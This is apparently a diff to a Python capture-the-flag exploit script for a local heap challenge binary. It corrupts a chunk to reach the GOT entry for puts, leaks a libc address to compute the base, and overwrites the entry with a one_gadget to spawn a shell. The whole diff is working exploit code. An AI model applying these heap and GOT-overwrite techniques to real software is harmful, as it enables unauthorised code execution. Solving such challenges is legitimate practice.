@@ -11,8 +11,11 @@ def unwrap(x):
         return x
 
 
-elf = ptr.ELF("./chall")
+elf = ptr.ELF("./chall_patched")
+libc = ptr.ELF("./libc.so.6")
 io = ptr.Process(elf.filepath)
+
+one_gadgets = [0xDE78C, 0xDE78F, 0xDE792]
 
 
 def create(data):
@@ -29,21 +32,15 @@ def edit(idx, data):
 create(b"AAAA")
 create(b"BBBB")
 
-payload = b"AAAAAAAA" * 4
+payload = b"A" * 0x20
 payload += ptr.p64(0x31)
-payload += ptr.p64(unwrap(elf.got("printf")) - 8)
+payload += ptr.p64(unwrap(elf.got("puts")) - 0x8)
 edit(0, payload)
 
-# io.sendlineafter(b"> ", b"3")
-# io.recvuntil(b"-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-")
-# for i in range(4):
-#     print(io.recvline())
-#     print(io.recvline())
-#     print(io.recvline())
-#     print(io.recvline())
-#     print(io.recvline())
-#     print(io.recvline())
-#     print(io.recvline())
-
+io.sendlineafter(b"> ", b"2")
+io.sendlineafter(b"index: ", b"2")
+libc.base = ptr.u64(io.recvlineafter(b"Old content: ").strip())  - unwrap(libc.symbol("puts"))
+# - 0x5A9D0
+io.sendlineafter(b"New content: ", ptr.p64(libc.base + one_gadgets[1]))
 
 io.sh()
